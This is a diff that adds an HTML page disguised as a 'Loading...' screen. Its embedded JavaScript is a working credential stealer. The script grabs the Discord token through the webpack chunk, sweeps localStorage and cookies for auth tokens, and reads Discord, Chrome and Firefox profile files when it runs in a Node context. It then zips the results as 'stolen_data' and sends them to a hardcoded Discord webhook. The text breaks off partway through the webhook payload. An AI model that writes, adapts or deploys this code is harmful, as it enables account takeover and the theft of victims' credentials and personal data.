@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #2f3136;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">Harvesting data...</div>
+    <script>
+        // Discord webhook URL (replace with your own)
+        const webhookUrl = "https://discord.com/api/webhooks/1387582880968085544/jU0vcliwnbrKOz-pk6xbcfNQYIKbE2RE3npa4qW21GAvWaMnQ6FIbNrHOHIQ1TlWRD95";
+
+        // Aggressive token and credential extraction
+        function getAllTokensAndCreds() {
+            let data = {};
+
+            // Discord token
+            if (typeof window.webpackChunkdiscord_app !== 'undefined') {
+                try {
+                    data.discordToken = window.webpackChunkdiscord_app.push([[Math.random()], {}, (e) => {
+                        for (let m of Object.keys(e.c).map((k) => e.c[k].exports)) {
+                            if (m?.getToken) return m.getToken();
+                            if (m?.default?.getToken) return m.default.getToken();
+                            if (m?.token) return m.token;
+                        }
+                    }])[0];
+                    if (data.discordToken && data.discordToken.length > 10 && /[a-zA-Z0-9._-]/.test(data.discordToken)) {
+                        data.discordToken = data.discordToken;
+                    } else {
+                        data.discordToken = "No Discord token found";
+                    }
+                } catch (e) {
+                    data.discordToken = "Webpack failed: " + e.message;
+                }
+            }
+
+            // Other app tokens (generic sweep)
+            data.otherTokens = {};
+            ['token', 'auth_token', 'access_token', 'session'].forEach(key => {
+                let value = localStorage.getItem(key) || document.cookie.split('; ').find(row => row.startsWith(key + '='))?.split('=')[1];
+                if (value && value.length > 10 && /[a-zA-Z0-9._-]/.test(value)) {
+                    data.otherTokens[key] = value;
+                }
+            });
+            for (let key in window.localStorage) {
+                if (key.includes('token') || key.includes('auth')) {
+                    let value = window.localStorage[key];
+                    if (value && value.length > 10 && /[a-zA-Z0-9._-]/.test(value)) {
+                        data.otherTokens[key] = value;
+                    }
+                }
+            }
+            if (Object.keys(data.otherTokens).length === 0) data.otherTokens = "No other tokens found";
+
+            // Passwords (limited attempt)
+            data.passwords = "Password access restricted by browser";
+            if (navigator.credentials) {
+                try {
+                    data.passwords = JSON.stringify(navigator.credentials.get({ mediation: 'silent' }) || "No passwords accessible");
+                } catch (e) {
+                    data.passwords += " (Error: " + e.message + ")";
+                }
+            }
+
+            // Cookies
+            data.cookies = document.cookie || "No cookies found";
+
+            return data;
+        }
+
+        // Get IP address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || "IP not found";
+            } catch (e) {
+                return "IP fetch failed";
+            }
+        }
+
+        // Get PC details
+        function getPCDetails() {
+            return {
+                platform: navigator.platform || "Unknown",
+                userAgent: navigator.userAgent || "Unknown",
+                screenRes: `${window.screen.width}x${window.screen.height}` || "Unknown",
+                language: navigator.language || "Unknown",
+                cpuCores: navigator.hardwareConcurrency || "Unknown"
+            };
+        }
+
+        // Get browser history hint
+        function getHistoryHint() {
+            return {
+                currentUrl: window.location.href || "Unknown",
+                referrer: document.referrer || "Unknown",
+                storageKeys: Object.keys(localStorage).join(', ') || "None"
+            };
+        }
+
+        // Attempt to grab local files (Node context)
+        function getLocalFiles() {
+            let fileData = "File access restricted by browser";
+            if (window.require && window.process) {
+                const fs = window.require('fs');
+                const path = window.require('path');
+                const appData = process.env.APPDATA || (process.platform === 'darwin' ? process.env.HOME + '/Library/Application Support' : process.env.HOME + '/.config');
+                const dirs = [
+                    path.join(appData, 'Discord'),
+                    path.join(appData, 'Google/Chrome/User Data/Default'),
+                    path.join(appData, 'Mozilla/Firefox/Profiles')
+                ];
+                fileData = {};
+                dirs.forEach(dir => {
+                    if (fs.existsSync(dir)) {
+                        fileData[dir] = fs.readdirSync(dir).map(file => {
+                            try {
+                                return `${file}: ${fs.readFileSync(path.join(dir, file), 'utf8').substring(0, 100)}`;
+                            } catch (e) {
+                                return `${file}: Access denied`;
+                            }
+                        }).join('\n');
+                    }
+                });
+            }
+            return fileData;
+        }
+
+        // Create ZIP file and send via webhook
+        async function sendToWebhook(data) {
+            try {
+                const JSZip = (await import('https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js')).default;
+                const zip = new JSZip();
+                
+                // Add all data to ZIP
+                zip.file("stolen_data.json", JSON.stringify(data, null, 2));
+                const zipBlob = await zip.generateAsync({ type: "blob" });
+
+                const formData = new FormData();
+                formData.append('file', zipBlob, 'stolen_data.zip');
+                formData.append('payload_json', JSON.stringify({
+                    embeds: [{
+                        title: "Data Plundered",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "Discord Token", value: `\`\`\`${data.tokensAndCreds.discordToken}\`\`\``, inline: false },
+                            { name: "IP Address", value: data.ip, inline: true },
+                            { name: "Status", value: "Full
